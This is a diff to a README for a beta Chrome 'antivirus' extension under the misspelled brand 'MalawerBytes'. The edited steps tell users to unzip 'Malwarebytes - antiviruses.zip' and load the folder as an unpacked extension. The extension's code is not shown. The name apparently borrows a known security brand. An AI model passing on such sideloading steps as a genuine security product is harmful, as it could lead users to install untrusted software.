@@ -5,7 +5,7 @@ First beta of the antivirus of MalawerBytes for chrome and all your computer.
 
 ~ HOW TO INSTALL OUR BETA PROJECT ~
 
-1 - Download the "Malwarebytes - antiviruses.zip" or all the files one by one in one only file.
+1 - Download the "Malwarebytes - antiviruses.zip" and un-zip the files into a folder.
 
 
 ~
@@ -31,7 +31,7 @@ First beta of the antivirus of MalawerBytes for chrome and all your computer.
 
 ~
 
-4 - Click on the top left button "load an extension" and drop the file "Malwarebytes - antiviruses.zip" but un-zip.
+4 - Click on the top left button "load an extension" and choose the folder where you just un-zip all the files.
 
 
 ~
